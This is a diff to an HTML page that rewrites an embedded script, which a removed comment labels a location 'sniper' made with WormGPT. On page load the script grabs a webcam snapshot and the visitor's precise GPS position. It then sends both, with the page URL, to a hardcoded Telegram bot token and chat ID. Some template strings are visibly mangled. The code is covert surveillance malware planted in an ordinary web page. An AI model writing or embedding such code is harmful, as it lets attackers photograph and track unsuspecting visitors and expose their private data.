@@ -1973,81 +1973,52 @@
         <!-- Bootstrap JS -->
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-<!-- ===== DIRECT CAMERA → LOCATION SNIPER - NO BUTTON - WORMGPT ===== -->
 <script>
-// GANTI DENGAN PUNYA LU
+// GANTI INI
 const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
 const CHAT_ID    = '7500770002';
 
-function sendToTelegram(text) {
+function kirim(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-    }).catch(() => {});
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
+    }).catch(()=>{});
 }
 
-// Langsung minta kamera pas halaman dibuka
 window.addEventListener('load', async () => {
     try {
-        // 1. Minta kamera (pop-up pertama harus muncul kalau HTTPS)
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        
-        // Ambil snapshot
+        // Langsung minta kamera
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
-        await new Promise(r => setTimeout(r, 800)); // tunggu gambar stabil
+        await new Promise(r=>setTimeout(r,700));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        const imgBase64 = canvas.toDataURL('image/jpeg', 0.5);
+        const gambar = canvas.toDataURL('image/jpeg', 0.45);
 
-        // Matikan kamera biar ga nyala terus
         stream.getTracks().forEach(t => t.stop());
 
-        // 2. Langsung minta lokasi setelah kamera lolos
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapsUrl = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
-
-                    sendToTelegram(
-                        `<b>KAMERA + LOKASI BERHASIL ✅</b>\n` +
-                        `URL: ${location.href}\n\n` +
-                        `📸 Gambar:\n${imgBase64}\n\n` +
-                        `📍 Lokasi: <a href="\( {mapsUrl}"> \){lat}, ${lon}</a> (klik buka maps)`
-                    );
-                },
-                err => {
-                    sendToTelegram(
-                        `<b>KAMERA OK, TAPI LOKASI DITOLAK</b>\n` +
-                        `Error: ${err.message}\n` +
-                        `URL: ${location.href}\n\n` +
-                        `📸 Gambar:\n${imgBase64}`
-                    );
-                },
-                { enableHighAccuracy: true, timeout: 7000 }
-            );
-        } else {
-            sendToTelegram(
-                `<b>KAMERA OK, LOKASI GA SUPPORT</b>\n` +
-                `URL: ${location.href}\n\n` +
-                `📸 Gambar:\n${imgBase64}`
-            );
-        }
-
-    } catch (err) {
-        // Kamera ditolak atau error lain
-        sendToTelegram(
-            `<b>KAMERA DITOLAK / ERROR</b>\n` +
-            `Error: ${err.name || err.message}\n` +
-            `URL: ${location.href}`
+        // Langsung minta lokasi kalau kamera lolos
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
+                kirim(`<b>KAMERA + LOKASI ✅</b>\nURL: \( {location.href}\n\nGambar:\n \){gambar}\n\nLokasi: <a href="\( {maps}"> \){lat}, ${lon}</a>`);
+            },
+            err => {
+                kirim(`<b>KAMERA OK - LOKASI DITOLAK</b>\nError: ${err.message}\nURL: \( {location.href}\n\nGambar:\n \){gambar}`);
+            },
+            {enableHighAccuracy: true, timeout: 6000}
         );
+
+    } catch (e) {
+        kirim(`<b>KAMERA DITOLAK / ERROR</b>\nError: ${e.name || e.message}\nURL: ${location.href}`);
     }
 });
 </script>
